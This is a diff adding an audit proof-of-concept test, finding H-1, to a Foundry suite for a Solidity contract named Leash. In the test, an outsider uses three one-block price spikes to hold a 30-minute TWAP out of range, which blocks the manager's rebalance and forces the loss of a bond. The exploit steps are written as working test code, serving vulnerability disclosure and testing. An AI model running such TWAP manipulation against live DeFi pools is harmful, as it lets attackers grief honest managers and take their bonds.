@@ -217,4 +217,47 @@ contract LeashAuditTest is Test, Deployers {
 
         assertLe(gain, 1e18, "manager extracted treasury inventory");
     }
+
+    // ================================================================ H-1
+
+    function _keep(uint256 until) internal {
+        while (block.timestamp + 1 minutes <= until) {
+            _next(1 minutes);
+            leash.checkpoint(key);
+        }
+    }
+
+    /// One block parked at MAX_TICK and straight back: the TWAP sits out of range for ~30 min.
+    function _spike() internal {
+        _swapAs(eve, false, TickMath.MAX_SQRT_PRICE - 1);
+        _next(12);
+        _swapToTick(eve, 0);
+    }
+
+    /// H-1. Anyone (the treasury above all, since it receives the bond) breaches an honest manager for the cost of
+    /// three round trips through one side of the treasury's own position. Each spike holds the 30-min TWAP at ~5915
+    /// for a full window; the manager can't re-range because spot is back at market, far from the TWAP. A keeper
+    /// checkpointing every minute doesn't help: the TWAP really is out of range. 3 x 30 min > the 72 min allowed.
+    function test_H1_outsiderForcesBreachWithThreeOneBlockSpikes() public {
+        _win();
+        uint256 before = _value(eve);
+        for (uint256 i; i < 3; i++) {
+            _keep(block.timestamp + 1 hours);
+            _spike();
+            if (i == 0) {
+                vm.prank(alice);
+                vm.expectRevert(Leash.SpotOffTwap.selector);
+                leash.rebalance(key, -600, 600, 1_000e18); // the manager can't defend
+            }
+        }
+        _keep(auctionEnd + 1 days);
+        uint256 cost = before - _value(eve);
+        emit log_named_decimal_uint("attacker cost (tokens at 1:1)", cost, 18);
+        vm.warp(auctionEnd + 1 days);
+        leash.settle(key, 0);
+        EpochRecord memory e = leash.epochRecord(key.toId(), 0);
+        emit log_named_uint("outSecs", e.outSecs);
+        emit log_named_decimal_uint("bond to the treasury", leash.owed(address(this), currency1), 18);
+        assertTrue(e.clean, "an always-in-range manager was breached");
+    }
 }
